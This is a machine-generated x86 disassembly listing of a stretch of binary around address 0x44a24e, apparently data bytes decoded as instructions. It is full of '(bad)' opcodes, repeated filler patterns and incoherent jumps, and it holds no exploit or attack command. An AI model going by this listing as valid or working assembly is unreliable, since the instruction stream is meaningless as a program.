  44a24e:	call   DWORD PTR [ebx]
  44a250:	or     ebx,0xffffffff
  44a253:	iret   
  44a254:	stc    
  44a255:	(bad)  
  44a256:	dec    ebx
  44a258:	clc    
  44a259:	(bad)  
  44a25a:	inc    DWORD PTR [ecx]
  44a25c:	add    DWORD PTR [edi],ebp
  44a25e:	inc    DWORD PTR [ecx]
  44a260:	add    DWORD PTR [eax],eax
  44a262:	inc    DWORD PTR [eax]
  44a264:	add    BYTE PTR [ebx],bl
  44a266:	inc    DWORD PTR [eax]
  44a268:	add    BYTE PTR [esi],dl
  44a26a:	inc    DWORD PTR [eax]
  44a26c:	add    BYTE PTR [edi+edi*8],dl
  44a26f:	add    BYTE PTR [eax],al
  44a271:	push   ss
  44a272:	inc    DWORD PTR [ecx]
  44a274:	add    DWORD PTR [eax],eax
  44a276:	push   DWORD PTR ds:0xd0ffc246
  44a27c:	stc    
  44a27d:	(bad)  
  44a27e:	inc    DWORD PTR [ebp+0x58ffdbe3]
  44a284:	int    0xdb
  44a286:	jmp    FWORD PTR [esi-0x2a]
  44a289:	jecxz  0x44a28a
  44a28b:	push   esi
  44a28c:	mov    dl,0xbf
  44a28e:	(bad)  
  44a28f:	cmp    DWORD PTR [eax-0x58bf0052],ecx
  44a295:	ret    0x46ff
  44a298:	mov    eax,0xc868ffd1
  44a29d:	(bad)  
  44a29f:	sbb    DWORD PTR [esi+edi*4-0x2b50c101],ebx
  44a2a6:	(bad)  
  44a2a7:	cmp    bl,BYTE PTR [eax+0x78]
  44a2aa:	call   DWORD PTR ds:0x1cff6a16
  44a2b0:	sub    dl,BYTE PTR [ebp-0x1]
  44a2b3:	jg     0x44a284
  44a2b5:	loop   0x44a2b6
  44a2b7:	inc    ebp
  44a2b8:	(bad)  
  44a2b9:	sar    bh,0x4b
  44a2bc:	xchg   ebx,eax
  44a2bd:	ret    
  44a2be:	(bad)  
  44a2bf:	ds cdq 
  44a2c1:	sar    edi,0x48
  44a2c4:	test   al,0xcc
  44a2c6:	call   FWORD PTR [ebp-0x4a]
  44a2c9:	fcos   
  44a2cb:	pop    eax
  44a2cc:	(bad)
  44a2cf:	push   edx
  44a2d0:	test   al,0xcf
  44a2d2:	call   DWORD PTR [eax+0x2affeeed]
  44a2d8:	push   ecx
  44a2d9:	jge    0x44a2da
  44a2db:	add    DWORD PTR [ecx],eax
  44a2dd:	add    bh,bh
  44a2df:	add    DWORD PTR [eax],eax
  44a2e1:	sbb    bh,bh
  44a2e3:	add    BYTE PTR [eax],al
  44a2e5:	inc    DWORD PTR cs:[eax]
  44a2e8:	add    BYTE PTR [edi+edi*8],dh
  44a2eb:	add    BYTE PTR [eax],al
  44a2ed:	cmp    bh,bh
  44a2ef:	add    BYTE PTR [eax],al
  44a2f1:	xor    bh,bh
  44a2f3:	add    BYTE PTR [eax],al
  44a2f5:	xor    bh,bh
  44a2f7:	add    BYTE PTR [eax],al
  44a2f9:	sub    eax,0x310000ff
  44a2fe:	inc    DWORD PTR [ecx]
  44a300:	add    DWORD PTR [eax],eax
  44a302:	inc    DWORD PTR [ecx]
  44a304:	add    DWORD PTR [eax],eax
  44a306:	inc    DWORD PTR [esi+0x2bfff5c8]
  44a30c:	imul   ebx,DWORD PTR [ebp-0x5593d201],0xffffffff
  44a313:	and    al,BYTE PTR [ecx+ecx*4-0x1]
  44a317:	sub    eax,0x26ffa760
  44a31c:	inc    esi
  44a31d:	cmp    bh,0x23
  44a320:	jae    0x44a2d6
  44a322:	dec    DWORD PTR [eax]
  44a324:	outs   dx,BYTE PTR ds:[esi]
  44a325:	pushf  
  44a326:	inc    DWORD PTR [ecx]
  44a328:	add    DWORD PTR [eax],eax
  44a32a:	inc    DWORD PTR [ecx]
  44a32c:	add    DWORD PTR [eax],eax
  44a32e:	inc    DWORD PTR [ecx]
  44a330:	add    DWORD PTR [eax],eax
  44a332:	(bad)  
  44a333:	cmp    al,0x57
  44a335:	jbe    0x44a336
  44a337:	xchg   eax,edx
  44a339:	jmp    0x44a33a
  44a33b:	push   edi
  44a33c:	(bad)  
  44a33d:	fdiv   st(7),st
  44a33f:	inc    edi
  44a340:	mov    al,ds:0xa651ffcd
  44a345:	iret   
  44a346:	(bad)  
  44a347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a349:	sar    edi,1
  44a34b:	sub    al,0x8a
  44a34d:	sar    edi,0x20
  44a350:	addr16 mov ch,0xff
  44a353:	sub    DWORD PTR [ebp-0x1e3e0029],ebx
  44a359:	std    
  44a35a:	call   DWORD PTR [eax]
  44a35c:	and    BYTE PTR [edi+edi*8+0x1],bl
  44a360:	add    DWORD PTR [eax],eax
  44a362:	inc    DWORD PTR [eax]
  44a364:	add    BYTE PTR [ebx],bl
  44a366:	inc    DWORD PTR [eax]
  44a368:	add    BYTE PTR [esi],dl
  44a36a:	inc    DWORD PTR [eax]
  44a36c:	add    BYTE PTR [edi+edi*8],dl
  44a36f:	add    BYTE PTR [eax],al
  44a371:	adc    edi,edi
  44a373:	add    DWORD PTR [ecx],eax
  44a375:	add    bh,bh
  44a377:	and    al,0x2a
  44a379:	ins    DWORD PTR es:[edi],dx
  44a37a:	dec    ebx
  44a37c:	clc    
  44a37d:	(bad)  
  44a37e:	call   DWORD PTR [ecx+esi*4-0x3c]
  44a382:	(bad)  
  44a383:	cmp    ah,BYTE PTR [ebp-0x19620036]
  44a389:	icebp  
  44a38a:	call   FWORD PTR [eax+ecx*8-0x28]
  44a38e:	call   FWORD PTR [esi]
  44a390:	cmp    BYTE PTR [esi-0x61a7e701],0xff
  44a397:	sub    dh,BYTE PTR [esi-0x38ca002f]
  44a39d:	(bad)  
  44a39f:	cmp    DWORD PTR [eax-0x48960033],esi
  44a3a5:	out    0xff,eax
  44a3a7:	or     cl,BYTE PTR ds:0x50aff39
  44a3ad:	cmp    al,0xff
  44a3af:	adc    al,0x26
  44a3b1:	cmp    al,0xff
  44a3b3:	inc    esi
  44a3b4:	call   0xffbb:0x692bffde
  44a3bb:	inc    ecx
  44a3bc:	jbe    0x44a383
  44a3be:	jmp    DWORD PTR [ebp-0x5d]
  44a3c1:	out    0xff,al
  44a3c3:	pop    ecx
  44a3c4:	test   eax,0x720cffcd
  44a3c9:	mov    edx,0xd7bd59ff
  44a3ce:	jmp    FWORD PTR [edx+edx*8-0x10]
  44a3d2:	call   DWORD PTR [esi-0x67]
  44a3d5:	aam    0xff
  44a3d7:	add    DWORD PTR [ecx],eax
  44a3d9:	add    bh,bh
  44a3db:	add    DWORD PTR [ecx],eax
  44a3dd:	add    bh,bh
  44a3df:	add    DWORD PTR [ecx],eax
  44a3e1:	adc    eax,0x2b0000ff
  44a3e6:	inc    DWORD PTR [eax]
  44a3e8:	add    BYTE PTR [esi],ch
  44a3ea:	inc    DWORD PTR [eax]
  44a3ec:	add    BYTE PTR ds:0x370000ff,dh
  44a3f2:	inc    DWORD PTR [eax]
  44a3f4:	add    BYTE PTR [esi],dh
  44a3f6:	inc    DWORD PTR [eax]
  44a3f8:	add    BYTE PTR [ecx],dh
  44a3fa:	inc    DWORD PTR [eax]
  44a3fc:	add    BYTE PTR [esi],ch
  44a3fe:	inc    DWORD PTR [ecx]
  44a400:	add    DWORD PTR [eax],eax
  44a402:	inc    DWORD PTR [ecx]
  44a404:	add    DWORD PTR [eax],eax
  44a406:	call   FWORD PTR [edx]
  44a408:	xor    BYTE PTR [edi+edi*8-0xa8e3f4],al
  44a40f:	sbb    BYTE PTR ds:0x2211ff63,ch
  44a415:	push   eax
  44a416:	call   FWORD PTR [eax]
  44a418:	xor    DWORD PTR [ecx-0x1],edi
  44a41b:	and    bh,BYTE PTR [esi+edi*2]
  44a41e:	jmp    FWORD PTR [esi]
  44a420:	stos   DWORD PTR es:[edi],eax
  44a421:	sar    bh,cl
  44a423:	setns  BYTE PTR [ebp+0x101ff]
  44a42a:	dec    DWORD PTR ds:0x1ff280a
  44a430:	add    DWORD PTR [eax],eax
  44a432:	inc    DWORD PTR [ecx]
  44a434:	add    DWORD PTR [eax],eax
  44a436:	jmp    FWORD PTR [eax]
  44a438:	push   edi
  44a439:	outs   dx,DWORD PTR ds:[esi]
  44a43a:	call   DWORD PTR [esi-0x46]
  44a43d:	(bad)  
  44a43f:	outs   dx,DWORD PTR cs:[esi]
  44a441:	sar    bh,0x47
  44a444:	(bad)  
  44a445:	sar    edi,0x3c
  44a448:	xchg   esp,eax
  44a449:	enter  0x1cff,0x5a
  44a44d:	stos   BYTE PTR es:[edi],al
  44a44e:	call   FWORD PTR [edx]
  44a450:	dec    esp
  44a451:	nop
  44a452:	call   DWORD PTR [esi]
  44a454:	jbe    0x44a41d
  44a456:	dec    DWORD PTR [esi-0x7a]
  44a459:	loopne 0x44a45a
  44a45b:	leave  
  44a45c:	stc    
  44a45d:	(bad)  
  44a45e:	inc    DWORD PTR [ecx]
  44a460:	add    DWORD PTR [eax],eax
  44a462:	dec    DWORD PTR [eax]
  44a464:	or     BYTE PTR [edi],al
  44a466:	inc    DWORD PTR [eax]
  44a468:	add    BYTE PTR [edi],dl
  44a46a:	inc    DWORD PTR [eax]
  44a46c:	add    BYTE PTR [ecx],dl
  44a46e:	inc    DWORD PTR [eax]
  44a470:	add    BYTE PTR [ecx],dl
  44a472:	inc    DWORD PTR [ecx]
  44a474:	add    DWORD PTR [eax],eax
  44a476:	call   DWORD PTR ds:0x4fff3e16
  44a47c:	xchg   ebx,eax
  44a47d:	into   
  44a47e:	(bad)  
  44a47f:	cmp    eax,0x23ffb083
  44a484:	pop    ebp
  44a485:	cwde   
  44a486:	jmp    FWORD PTR [eax]
  44a488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a489:	sar    bh,cl
  44a48b:	sbb    BYTE PTR [esi+0x731affbd],al
  44a491:	mov    eax,0xa65325ff
  44a496:	(bad)  
  44a497:	cmp    ebx,DWORD PTR [edx-0x5bdc003a]
  44a49d:	xlat   BYTE PTR ds:[ebx]
  44a49e:	inc    DWORD PTR [ecx-0x35]
  44a4a1:	idiv   edi
  44a4a3:	aaa    
  44a4a4:	js     0x44a472
  44a4a6:	inc    DWORD PTR [ecx]
  44a4a8:	add    DWORD PTR [eax],eax
  44a4aa:	inc    DWORD PTR [ecx]
  44a4ac:	add    DWORD PTR [eax],eax
  44a4ae:	inc    DWORD PTR [ecx]
  44a4b0:	add    DWORD PTR [eax],eax
  44a4b2:	inc    DWORD PTR [ecx]
  44a4b4:	add    DWORD PTR [eax],eax
  44a4b6:	inc    DWORD PTR [edi]
  44a4b8:	add    al,0xf
  44a4ba:	inc    DWORD PTR [eax]
  44a4bc:	add    BYTE PTR [edi+edi*8],dl
  44a4bf:	xor    BYTE PTR [eax-0x1a],al
  44a4c2:	jmp    FWORD PTR [ecx-0x27]
  44a4c5:	cmc    
  44a4c6:	call   DWORD PTR [edi]
  44a4c8:	mov    ecx,0x9c46ffe2
  44a4cd:	fdivp  st(7),st
  44a4cf:	and    al,BYTE PTR [edi-0x76]
  44a4d2:	push   DWORD PTR [esi]
  44a4d4:	inc    edi
  44a4d5:	jno    0x44a4d6
  44a4d7:	add    DWORD PTR [ecx],eax
  44a4d9:	add    bh,bh
  44a4db:	add    al,BYTE PTR [edx]
  44a4dd:	add    eax,0x180101ff
  44a4e2:	inc    DWORD PTR [eax]
  44a4e4:	add    BYTE PTR [esi],ch
  44a4e6:	inc    DWORD PTR [eax]
  44a4e8:	add    BYTE PTR [ebx],ch
  44a4ea:	inc    DWORD PTR [eax]
  44a4ec:	add    BYTE PTR [eax],dh
  44a4ee:	inc    DWORD PTR [eax]
  44a4f0:	add    BYTE PTR [eax],dh
  44a4f2:	inc    DWORD PTR [eax]
  44a4f4:	add    BYTE PTR [eax],dh
  44a4f6:	inc    DWORD PTR [eax]
  44a4f8:	add    BYTE PTR [eax],dh
  44a4fa:	inc    DWORD PTR [eax]
  44a4fc:	add    BYTE PTR [edi+edi*8],ch
  44a4ff:	add    DWORD PTR [ecx],eax
  44a501:	or     bh,bh
  44a503:	add    DWORD PTR [ecx],eax
  44a505:	add    bh,bh
  44a507:	push   es
  44a508:	adc    DWORD PTR [eax-0x1],eax
  44a50b:	or     BYTE PTR [esi],dl
  44a50d:	push   esp
  44a50e:	call   DWORD PTR [ebx]
  44a510:	adc    esi,DWORD PTR [edx]
  44a512:	dec    DWORD PTR ds:0xcff3512
  44a518:	push   ss
  44a519:	dec    eax
  44a51a:	jmp    DWORD PTR [edi]
  44a51c:	push   ecx
  44a51d:	mov    bh,bh
  44a51f:	sub    bh,BYTE PTR [ebp-0x4d]
  44a522:	inc    DWORD PTR [ecx]
  44a524:	add    DWORD PTR [eax],eax
  44a526:	inc    DWORD PTR [ecx]
  44a528:	add    DWORD PTR [eax],eax
  44a52a:	inc    DWORD PTR [eax]
  44a52c:	add    BYTE PTR [edi+edi*8],ah
  44a52f:	add    BYTE PTR [eax],al
  44a531:	daa    
  44a532:	inc    DWORD PTR [edi]
  44a534:	add    eax,0x101ff0b
  44a539:	add    bh,bh
  44a53b:	cmp    DWORD PTR [ebp+0x6630ffa6],ebx
  44a541:	ret    0x2fff
  44a544:	ins    DWORD PTR es:[edi],dx
  44a545:	sar    edi,0x33
  44a548:	jbe    0x44a50e
  44a54a:	call   DWORD PTR ds:0x18ff8f2f
  44a550:	dec    esi
  44a551:	mov    ds:0xa33412ff,eax
  44a556:	dec    DWORD PTR [eax]
  44a558:	xor    eax,0xcf8cffba
  44a55d:	(bad)  
  44a55e:	inc    DWORD PTR [ecx]
  44a560:	add    DWORD PTR [eax],eax
  44a562:	inc    DWORD PTR [ecx]
  44a564:	add    DWORD PTR [eax],eax
  44a566:	inc    DWORD PTR [eax]
  44a568:	add    BYTE PTR [esi],dl
  44a56a:	inc    DWORD PTR [eax]
  44a56c:	add    BYTE PTR [ebx],dl
  44a56e:	inc    DWORD PTR [eax]
  44a570:	add    BYTE PTR [edi],cl
  44a572:	inc    DWORD PTR [ecx]
  44a574:	add    DWORD PTR [eax],eax
  44a576:	call   FWORD PTR [eax]
  44a578:	sbb    BYTE PTR [edi],bh
  44a57a:	inc    DWORD PTR [ebp+0x3cffeaca]
  44a580:	lea    edi,[eax-0x2c47ca01]
  44a586:	jmp    FWORD PTR [edx]
  44a588:	mov    ds:0x6330ffca,eax
  44a58d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a58e:	call   FWORD PTR [eax]
  44a590:	dec    esp
  44a591:	sahf   
  44a592:	jmp    DWORD PTR [eax]
  44a594:	dec    esi
  44a595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a596:	(bad)  
  44a597:	cmp    eax,0x3ffe899
  44a59c:	sbb    eax,0x1309ff8c
  44a5a1:	inc    eax
  44a5a2:	inc    DWORD PTR [ecx]
  44a5a4:	add    DWORD PTR [eax],eax
  44a5a6:	inc    DWORD PTR [eax]
  44a5a8:	add    BYTE PTR [ecx],dh
  44a5aa:	inc    DWORD PTR [eax]
  44a5ac:	add    BYTE PTR [edx],ah
  44a5ae:	inc    DWORD PTR [eax]
  44a5b0:	add    BYTE PTR [edx],ah
  44a5b2:	inc    DWORD PTR [eax]
  44a5b4:	add    BYTE PTR [edi+edi*8],ah
  44a5b7:	add    BYTE PTR [eax],al
  44a5b9:	sub    bh,bh
  44a5bb:	or     al,BYTE PTR ds:0x431fff0c
  44a5c1:	(bad)  
  44a5c3:	das    
  44a5c4:	test   eax,ebp
  44a5c6:	inc    DWORD PTR ds:0x5ffad22
  44a5cc:	or     ah,BYTE PTR [ebx-0x1]
  44a5cf:	adc    ebp,DWORD PTR [esp+ecx*4]
  44a5d2:	jmp    DWORD PTR [edi-0x48]
  44a5d5:	loope  0x44a5d6
  44a5d7:	aaa    
  44a5d8:	test   BYTE PTR [eax+0x101ff],bh
  44a5de:	inc    DWORD PTR [eax]
  44a5e0:	add    BYTE PTR [edx],bl
  44a5e2:	inc    DWORD PTR [eax]
  44a5e4:	add    BYTE PTR [edi+edi*8],ch
  44a5e7:	add    BYTE PTR [eax],al
  44a5e9:	sub    bh,bh
  44a5eb:	add    BYTE PTR [eax],al
  44a5ed:	sub    bh,bh
  44a5ef:	add    BYTE PTR [eax],al
  44a5f1:	and    al,0xff
  44a5f3:	add    BYTE PTR [eax],al
  44a5f5:	and    eax,0x270000ff
  44a5fa:	inc    DWORD PTR [eax]
  44a5fc:	add    BYTE PTR [ecx],ch
  44a5fe:	inc    DWORD PTR [eax]
  44a600:	add    DWORD PTR [eax],ecx
  44a602:	inc    DWORD PTR [ecx]
  44a604:	add    DWORD PTR [eax],eax
  44a606:	jmp    DWORD PTR ds:0x6ffc94f
  44a60c:	adc    DWORD PTR [ecx-0x1],edx
  44a60f:	pop    ss
  44a610:	sbb    al,0x4d
  44a612:	call   FWORD PTR [ecx]
  44a614:	sbb    al,0x41
  44a616:	dec    DWORD PTR [ebx]
  44a618:	or     al,0x28
  44a61a:	jmp    DWORD PTR [edx]
  44a61c:	inc    ebp
  44a61d:	xchg   esp,eax
  44a61e:	push   DWORD PTR [eax]
  44a620:	jns    0x44a5f3
  44a622:	inc    DWORD PTR [ecx]
  44a624:	add    DWORD PTR [ecx],eax
  44a626:	inc    DWORD PTR [ecx]
  44a628:	add    DWORD PTR [eax],eax
  44a62a:	inc    DWORD PTR [eax]
  44a62c:	add    BYTE PTR [ebx],ah
  44a62e:	inc    DWORD PTR [eax]
  44a630:	add    BYTE PTR [ebx],ah
  44a632:	inc    DWORD PTR [eax]
  44a634:	add    BYTE PTR [edi+edi*8],ah
  44a637:	push   es
  44a638:	add    al,BYTE PTR ds:0x101ff
  44a63e:	dec    DWORD PTR [ebx-0x3a]
  44a641:	(bad)  
  44a643:	sub    ecx,DWORD PTR [ebp+0x3619ffdf]
  44a649:	xchg   esi,eax
  44a64a:	call   FWORD PTR [ecx]
  44a64c:	xor    bl,BYTE PTR [ecx+0x6a220fff]
  44a652:	dec    DWORD PTR [esi+eiz*1]
  44a655:	pushf  
  44a656:	inc    DWORD PTR [esi+ebp*1]
  44a659:	(bad)  
  44a65a:	inc    DWORD PTR [eax-0x51]
  44a65d:	cmc    
  44a65e:	inc    esi
  44a660:	clc    
  44a661:	(bad)  
  44a662:	inc    DWORD PTR [ecx]
  44a664:	add    DWORD PTR [eax],eax
  44a666:	inc    DWORD PTR [ebx]
  44a668:	add    edx,DWORD PTR [ecx]
  44a66a:	inc    DWORD PTR [eax]
  44a66c:	add    BYTE PTR [ecx],dl
  44a66e:	inc    DWORD PTR [eax]
  44a670:	add    BYTE PTR [edx],dl
  44a672:	inc    DWORD PTR [ecx]
  44a674:	add    DWORD PTR [eax],eax
  44a676:	dec    DWORD PTR [esi]
  44a678:	push   cs
  44a679:	notrack jmp DWORD PTR [eax-0x5b]
  44a67d:	lock dec DWORD PTR [ecx-0x56]
  44a681:	xlat   BYTE PTR ds:[ebx]
  44a682:	call   DWORD PTR [ebx]
  44a684:	shl    cl,0xff
  44a687:	push   eax
  44a688:	ret    0xffe9
  44a68b:	dec    ebp
  44a68c:	jnp    0x44a64e
  44a68e:	push   DWORD PTR [edx]
  44a690:	mov    cx,0x1dff
  44a694:	cmp    al,0x9b
  44a696:	push   DWORD PTR [edi]
  44a698:	scas   eax,DWORD PTR es:[edi]
  44a699:	idiv   bh
  44a69b:	add    ecx,DWORD PTR [edi]
  44a69d:	pop    ecx
  44a69e:	inc    DWORD PTR [ecx]
  44a6a0:	add    DWORD PTR [eax],eax
  44a6a2:	inc    DWORD PTR [ecx]
  44a6a4:	add    DWORD PTR [eax],eax
  44a6a6:	inc    DWORD PTR [eax]
  44a6a8:	add    BYTE PTR ds:0x1f0000ff,bl
  44a6ae:	inc    DWORD PTR [eax]
  44a6b0:	add    BYTE PTR [edx],ah
  44a6b2:	inc    DWORD PTR [eax]
  44a6b4:	add    BYTE PTR [ecx],ah
  44a6b6:	inc    DWORD PTR [eax]
  44a6b8:	add    BYTE PTR [esi],bl
  44a6ba:	inc    DWORD PTR [ecx]
  44a6bc:	add    DWORD PTR [eax],eax
  44a6be:	inc    DWORD PTR [eax]
  44a6c0:	add    eax,0x101ff61
  44a6c5:	add    bh,bh
  44a6c7:	add    al,BYTE PTR [edx]
  44a6c9:	add    edi,edi
  44a6cb:	adc    esp,DWORD PTR [edx*4-0x35a4d301]
  44a6d2:	call   DWORD PTR [edx]
  44a6d4:	dec    eax
  44a6d5:	ret    0xcff
  44a6d8:	inc    esp
  44a6d9:	mov    eax,0x101ff
  44a6de:	inc    DWORD PTR [ecx]
  44a6e0:	add    DWORD PTR ds:0x250000ff,ecx
  44a6e6:	inc    DWORD PTR [eax]
  44a6e8:	add    BYTE PTR [ecx],ah
  44a6ea:	inc    DWORD PTR [eax]
  44a6ec:	add    BYTE PTR ds:0x260000ff,ah
  44a6f2:	inc    DWORD PTR [eax]
  44a6f4:	add    BYTE PTR [ecx],ch
  44a6f6:	inc    DWORD PTR [eax]
  44a6f8:	add    BYTE PTR [edi],ah
  44a6fa:	inc    DWORD PTR [eax]
  44a6fc:	add    BYTE PTR [eax],ch
  44a6fe:	inc    DWORD PTR [eax]
  44a700:	add    DWORD PTR [eax],ecx
  44a702:	inc    DWORD PTR [ecx]
  44a704:	add    DWORD PTR [ecx],eax
  44a706:	call   FWORD PTR [edx]
  44a708:	cmp    al,0x90
  44a70a:	inc    DWORD PTR [edi+ecx*1]
  44a70d:	pop    eax
  44a70e:	dec    DWORD PTR [ecx]
  44a710:	pop    ss
  44a711:	pop    edi
  44a712:	call   FWORD PTR [edx]
  44a714:	and    al,0x54
  44a716:	call   FWORD PTR [esi]
  44a718:	sub    bl,BYTE PTR [edi-0x1]
  44a71b:	and    DWORD PTR [edx-0x5f],eax
  44a71e:	push   DWORD PTR ds:0x9ffd67f
  44a724:	pop    ss
  44a725:	xchg   edi,eax
  44a726:	inc    DWORD PTR [ecx]
  44a728:	add    DWORD PTR [eax],eax
  44a72a:	inc    DWORD PTR [eax]
  44a72c:	add    BYTE PTR [esi],bl
  44a72e:	inc    DWORD PTR [eax]
  44a730:	add    BYTE PTR [esi],bl
  44a732:	inc    DWORD PTR [eax]
  44a734:	add    BYTE PTR [esi],bl
  44a736:	inc    DWORD PTR [eax]
  44a738:	add    BYTE PTR ds:0xff,bl
  44a73e:	inc    DWORD PTR [ecx]
  44a740:	add    DWORD PTR [eax],eax
  44a742:	jmp    FWORD PTR [edx]
  44a744:	popf   
  44a745:	cli    
  44a746:	call   DWORD PTR [edx]
  44a748:	aaa    
  44a749:	mov    eax,0xa03719ff
  44a74e:	dec    DWORD PTR [ebx+ebx*1]
  44a751:	(bad)  
  44a752:	dec    DWORD PTR [ebx+eiz*1]
  44a755:	cmp    edi,0xffb72406
  44a75b:	xor    BYTE PTR [eax-0x74bc001e],cl
  44a761:	jecxz  0x44a762
  44a763:	add    BYTE PTR [eax],al
  44a765:	or     eax,0xb0101ff
  44a76a:	inc    DWORD PTR [eax]
  44a76c:	add    BYTE PTR [eax],dl
  44a76e:	inc    DWORD PTR [eax]
  44a770:	add    BYTE PTR [ecx],dl
  44a772:	inc    DWORD PTR [ecx]
  44a774:	add    DWORD PTR [eax],eax
  44a776:	inc    DWORD PTR [ecx]
  44a778:	add    DWORD PTR [edi+edi*8],esp
  44a77b:	xor    ebp,DWORD PTR [ebp-0x17]
  44a77e:	jmp    DWORD PTR [ebx*4+0x3a07fff8]
  44a785:	mov    ch,0xff
  44a787:	ds sahf 
  44a789:	call   0xcecbe88d
  44a78e:	push   DWORD PTR [eax]
  44a790:	pop    ebx
  44a791:	sar    bh,0x22
  44a794:	push   ebp
  44a795:	mov    ds:0xf79c31ff,eax
  44a79a:	inc    DWORD PTR [eax]
  44a79c:	add    eax,0xff60
  44a7a1:	add    bh,bh
  44a7a3:	add    BYTE PTR [eax],al
  44a7a5:	and    bh,bh
  44a7a7:	add    BYTE PTR [eax],al
  44a7a9:	sbb    eax,0x1e0000ff
  44a7ae:	inc    DWORD PTR [eax]
  44a7b0:	add    BYTE PTR [esi],bl
  44a7b2:	inc    DWORD PTR [eax]
  44a7b4:	add    BYTE PTR [edi],bl
  44a7b6:	inc    DWORD PTR [ebx+eax*1]
  44a7b9:	sbb    bh,bh
  44a7bb:	add    DWORD PTR [ecx],eax
  44a7bd:	add    bh,bh
  44a7bf:	add    DWORD PTR [ecx],eax
  44a7c1:	add    bh,bh
  44a7c3:	add    eax,DWORD PTR ds:0x3721ff09
  44a7c9:	test   al,0xff
  44a7cb:	push   ds
  44a7cc:	cs mov edi,edi
  44a7cf:	push   ss
  44a7d0:	sub    eax,0x461dff8e
  44a7d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a7d6:	call   FWORD PTR [ebx]
  44a7d8:	xor    BYTE PTR [ecx+0x101ff],bh
  44a7de:	inc    DWORD PTR [ecx]
  44a7e0:	add    DWORD PTR [eax],eax
  44a7e2:	inc    DWORD PTR [eax]
  44a7e4:	add    BYTE PTR [ecx],ch
  44a7e6:	inc    DWORD PTR [eax]
  44a7e8:	add    BYTE PTR [ebx],ah
  44a7ea:	inc    DWORD PTR [eax]
  44a7ec:	add    BYTE PTR [ebx],ah
  44a7ee:	inc    DWORD PTR [eax]
  44a7f0:	add    BYTE PTR [ecx],ah
  44a7f2:	inc    DWORD PTR [eax]
  44a7f4:	add    BYTE PTR [esi],ah
  44a7f6:	inc    DWORD PTR [eax]
  44a7f8:	add    BYTE PTR ds:0x250000ff,ah
  44a7fe:	inc    DWORD PTR [ecx]
  44a800:	add    DWORD PTR [ecx],ecx
  44a802:	inc    DWORD PTR [ecx]
  44a804:	add    DWORD PTR [ecx],eax
  44a806:	call   DWORD PTR ds:0x6ff812f
  44a80c:	adc    al,0x54
  44a80e:	call   DWORD PTR [edi]
  44a810:	and    al,0x53
  44a812:	dec    DWORD PTR [edi]
  44a814:	pop    ds
  44a815:	push   eax
  44a816:	call   FWORD PTR [edx]
  44a818:	and    DWORD PTR [esi-0x1],ecx
  44a81b:	and    bh,BYTE PTR [esi]
  44a81d:	xchg   edx,eax
  44a81e:	jmp    FWORD PTR [eax]
  44a820:	pop    ebx
  44a821:	mov    ecx,0x88210fff
  44a826:	inc    DWORD PTR [ecx]
  44a828:	add    DWORD PTR [eax],eax
  44a82a:	inc    DWORD PTR [eax]
  44a82c:	add    BYTE PTR [eax],ah
  44a82e:	inc    DWORD PTR [eax]
  44a830:	add    BYTE PTR [esi],bl
  44a832:	inc    DWORD PTR [eax]
  44a834:	add    BYTE PTR [ebx],bl
  44a836:	inc    DWORD PTR [eax]
  44a838:	add    BYTE PTR [edi+edi*8],bl
  44a83b:	or     al,BYTE PTR ds:0x101ff09
  44a841:	add    bh,bh
  44a843:	xor    esi,DWORD PTR [ebp+0x5e1effee]
  44a849:	(bad)  
  44a84b:	(bad)  
  44a84d:	lahf   
  44a84e:	dec    DWORD PTR [edi]
  44a850:	and    esi,DWORD PTR [eax-0x1]
  44a853:	or     dl,BYTE PTR [esi+eax*2]
  44a856:	dec    DWORD PTR [ecx]
  44a858:	sbb    BYTE PTR [edi+edi*8+0xf],dh
  44a85c:	cmp    DWORD PTR [edi+edi*8-0x175db8],edi
  44a863:	add    eax,0x1ff3109
  44a868:	add    DWORD PTR [eax],eax
  44a86a:	inc    DWORD PTR [eax]
  44a86c:	add    BYTE PTR [esi],cl
  44a86e:	inc    DWORD PTR [eax]
  44a870:	add    BYTE PTR [eax],dl
  44a872:	inc    DWORD PTR [ecx]
  44a874:	add    DWORD PTR [eax],eax
  44a876:	inc    DWORD PTR ds:0x14ff0a06
  44a87c:	ss sar edi,0x8
  44a880:	xor    bl,bh
  44a882:	call   DWORD PTR [eax]
  44a884:	cmp    eax,0x6631ffb8
  44a889:	mov    ds:0xdb8f3dff,eax
  44a88e:	jmp    FWORD PTR [esp+ecx*2]
  44a891:	test   eax,0xc3621eff
  44a896:	call   DWORD PTR [edi]
  44a898:	dec    edx
  44a899:	idiv   bh
  44a89b:	add    BYTE PTR [eax],al
  44a89d:	push   ecx
  44a89e:	dec    DWORD PTR [ecx]
  44a8a0:	or     DWORD PTR [edx],eax
  44a8a2:	inc    DWORD PTR [eax]
  44a8a4:	add    BYTE PTR [edi+edi*8],bl
  44a8a7:	add    BYTE PTR [eax],al
  44a8a9:	sbb    edi,edi
  44a8ab:	add    BYTE PTR [eax],al
  44a8ad:	sbb    edi,edi
  44a8af:	add    BYTE PTR [eax],al
  44a8b1:	sbb    bh,bh
  44a8b3:	add    BYTE PTR [eax],al
  44a8b5:	sbb    edi,edi
  44a8b7:	add    BYTE PTR [eax],al
  44a8b9:	push   ds
  44a8ba:	inc    DWORD PTR [ecx]
  44a8bc:	add    DWORD PTR [eax],eax
  44a8be:	dec    DWORD PTR [eax]
  44a8c0:	adc    dl,BYTE PTR [eax-0x1]
  44a8c3:	sub    BYTE PTR [edx-0x36],dl
  44a8c6:	call   FWORD PTR [edi]
  44a8c8:	sub    BYTE PTR [esi-0x1],ch
  44a8cb:	sub    DWORD PTR [edx],esi
  44a8cd:	cmp    edi,0x19
  44a8d0:	sub    edi,DWORD PTR [edi-0x1]
  44a8d3:	sbb    DWORD PTR [eax],edi
  44a8d5:	pushf  
  44a8d6:	call   FWORD PTR [edi]
  44a8d8:	cmp    al,0x9a
  44a8da:	call   DWORD PTR [edx]
  44a8dc:	sub    dl,al
  44a8de:	inc    DWORD PTR [ecx]
  44a8e0:	add    DWORD PTR [eax],eax
  44a8e2:	inc    DWORD PTR [ecx]
  44a8e4:	add    DWORD PTR [eax],eax
  44a8e6:	inc    DWORD PTR [eax]
  44a8e8:	add    BYTE PTR [esi],ah
  44a8ea:	inc    DWORD PTR [eax]
  44a8ec:	add    BYTE PTR [eax],ch
